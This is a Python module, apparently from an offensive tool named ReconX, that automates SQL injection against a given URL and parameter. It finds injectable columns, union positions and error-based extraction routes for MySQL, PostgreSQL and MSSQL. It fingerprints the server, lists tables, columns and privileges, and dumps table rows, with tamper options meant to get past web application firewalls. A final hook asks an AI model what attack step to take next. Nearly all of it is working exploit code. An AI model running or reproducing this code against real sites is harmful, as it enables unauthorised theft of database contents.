import re
from .core import Session, balance, detect_waf

ERR_KEYS = ["sql", "syntax", "mysql", "warning", "odbc", "jdbc", "postgresql", "sqlite", "ora-"]
OB_TPL = ["ORDER BY {i}-- -", "ORDER/**/BY {i}-- -", "GROUP BY {i}-- -", "ORDER BY {i}#"]
UN_TPL = ["UNION SELECT", "UNION ALL SELECT", "UNION/**/SELECT", "UNION%0aSELECT"]
FPRINT = {"version": {"mysql": "version()", "pgsql": "version()", "mssql": "@@version"},
          "user": {"mysql": "user()", "pgsql": "current_user", "mssql": "SYSTEM_USER"},
          "database": {"mysql": "database()", "pgsql": "current_database()", "mssql": "DB_NAME()"},
          "datadir": {"mysql": "@@datadir", "pgsql": "current_setting('data_directory')", "mssql": "@@SERVERNAME"},
          "secure_file_priv": {"mysql": "@@secure_file_priv", "pgsql": "current_setting('data_directory')", "mssql": "DB_NAME()"}}

class SQLi:
    def __init__(self, url, param, method="GET", data=None, cookie=None, proxy=None,
                 ua=None, no_redirect=False, tamper="plain", dbms="mysql", replaces=None):
        self.s = Session(proxy=proxy, ua=ua, cookie=cookie, no_redirect=no_redirect)
        self.url, self.param = url, param
        self.method, self.data = method.upper(), dict(data or {})
        self.tamper, self.dbms, self.replaces = tamper, dbms, replaces or []
        self.pre, self.cols, self.pos = "", None, None

    def _send(self, payload):
        for old, new in self.replaces: payload = payload.replace(old, new)
        p = balance(payload, self.tamper)
        if self.method == "GET":
            if self.tamper in ("plus", "encode", "double", "comment"):
                sep = "&" if "?" in self.url else "?"
                return self.s.get(f"{self.url}{sep}{self.param}={p}")
            return self.s.get(self.url, params={self.param: p})
        d = dict(self.data); d[self.param] = p
        return self.s.post(self.url, data=d)

    def find_columns(self, max_cols=30):
        for pre in ("", "'"):
            bl = (self._send(f"1{pre} ORDER BY 1-- -").status_code,
                  len(self._send(f"1{pre} ORDER BY 1-- -").text))
            for tpl in OB_TPL:
                for i in range(2, max_cols + 1):
                    r = self._send(f"1{pre} {tpl.format(i=i)}")
                    if (r.status_code, len(r.text)) != bl or any(k in r.text.lower() for k in ERR_KEYS):
                        self.pre, self.cols = pre, i - 1
                        return self.cols
        return None

    def find_union(self):
        if not self.cols: return None
        for tpl in UN_TPL:
            for pos in range(self.cols):
                nulls = ["NULL"] * self.cols; nulls[pos] = f"rnx{pos}z"
                if f"rnx{pos}z" in self._send(f"1{self.pre} {tpl} {','.join(nulls)}-- -").text:
                    self.pos = pos; return pos
        return None

    def _wrap(self, expr):
        if self.dbms == "mysql": return f"CONCAT(0x726e7853,{expr},0x726e7845)"
        if self.dbms == "pgsql": return f"concat('rnxS',{expr},'rnxE')"
        return f"'rnxS'+CAST({expr} AS NVARCHAR(4000))+'rnxE'"

    def union_extract(self, expr):
        nulls = ["NULL"] * self.cols; nulls[self.pos] = self._wrap(expr)
        m = re.search(r"rnxS(.*?)rnxE", self._send(f"1{self.pre} UNION SELECT {','.join(nulls)}-- -").text, re.S)
        return m.group(1) if m else None

    def error_extract(self, query):
        """Error-based: xpath (extractvalue/updatexml) + double query"""
        if self.dbms == "mysql":
            tries = [f"1{self.pre} AND extractvalue(1,concat(0x7e,({query}),0x7e))-- -",
                     f"1{self.pre} AND updatexml(1,concat(0x7e,({query}),0x7e),1)-- -",
                     f"1{self.pre} AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x7e,({query}),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -"]
            rx = r"~([^~'\"<]{1,32})"
        elif self.dbms == "pgsql":
            tries = [f"1{self.pre} AND 1=CAST(({query}) AS NUMERIC)-- -"]
            rx = r'syntax for type numeric: "(.+?)"'
        else:
            tries = [f"1{self.pre} AND 1=CONVERT(int,({query}))-- -"]
            rx = r"nvarchar value '(.+?)'"
        for p in tries:
            m = re.search(rx, self._send(p).text, re.S)
            if m: return m.group(1)
        return None

    def chunked(self, query, chunk=25, max_len=3000):
        out, i = "", 0
        while len(out) < max_len:
            part = self.error_extract(f"SELECT SUBSTRING(({query}),{i*chunk+1},{chunk})")
            if not part: break
            out += part; i += 1
        return out

    def get_tables(self):
        q = ("SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()"
             if self.dbms == "mysql" else
             "SELECT string_agg(table_name,',') FROM information_schema.tables WHERE table_schema=current_database()")
        return self.chunked(q)

    def get_columns(self, table):
        q = (f"SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='{table}'"
             if self.dbms == "mysql" else
             f"SELECT string_agg(column_name,',') FROM information_schema.columns WHERE table_name='{table}'")
        return self.chunked(q)

    def dump_data(self, table, cols, limit=10):
        cl = ",".join(cols)
        if self.dbms == "mysql":
            q = f"SELECT GROUP_CONCAT(CONCAT_WS(0x3a,{cl})) FROM (SELECT {cl} FROM {table} LIMIT {limit}) t"
        elif self.dbms == "pgsql":
            q = f"SELECT string_agg({cl}::text,':') FROM (SELECT {cl} FROM {table} LIMIT {limit}) t"
        else:
            q = f"SELECT STRING_AGG(CONCAT({cl}),':') FROM (SELECT TOP {limit} {cl} FROM {table}) t"
        return self.chunked(q)

    def privs(self):
        q = ("SELECT CONCAT(GRANTEE,0x3a,PRIVILEGE_TYPE) FROM information_schema.user_privileges LIMIT 10"
             if self.dbms == "mysql" else
             "SELECT GRANTEE||':'||PRIVILEGE_TYPE FROM information_schema.user_privileges LIMIT 10")
        return self.chunked(q)

def run(args):
    data = dict(kv.split("=", 1) for kv in args.data.split("&")) if args.data else None
    replaces = [tuple(r.split(":", 1)) for r in args.replace]
    x = SQLi(args.url, args.param, args.method, data, args.cookie, args.proxy,
             args.ua, args.no_redirect, args.tamper, args.dbms, replaces)
    print(f"[*] {args.url} | param={args.param} | dbms={args.dbms} | tamper={args.tamper}")
    r0 = x._send("1")
    print(f"[i] WAF: {detect_waf(r0)}")
    if not x.find_columns(): print("[-] Not injectable."); return
    print(f"[+] Columns: {x.cols}")
    pos = x.find_union()
    print(f"[+] Union pos: {pos}" if pos is not None else "[~] Union reflect nahi — error-based mode")
    for name in args.fprint:
        expr = FPRINT.get(name, {}).get(x.dbms)
        if expr: print(f"[+] {name} = {x.union_extract(expr) if pos is not None else x.error_extract(f'SELECT {expr}')}")
    if args.tables: print("[+] Tables:", x.get_tables())
    if args.columns: print(f"[+] Columns of {args.columns}:", x.get_columns(args.columns))
    if args.dump:
        cols = [c for c in (x.get_columns(args.dump) or "").split(",") if c]
        print(f"[+] DUMP {args.dump}: {x.dump_data(args.dump, cols, args.limit)}")
    if args.privs: print("[+] Privileges:", x.privs())
    if args.ai:
        from .ai import ask
        print("\n=== ReconX AI ===\n" + ask(f"SQLi: cols={x.cols}, union={pos}, dbms={x.dbms}. Aage kya karu? Short steps."))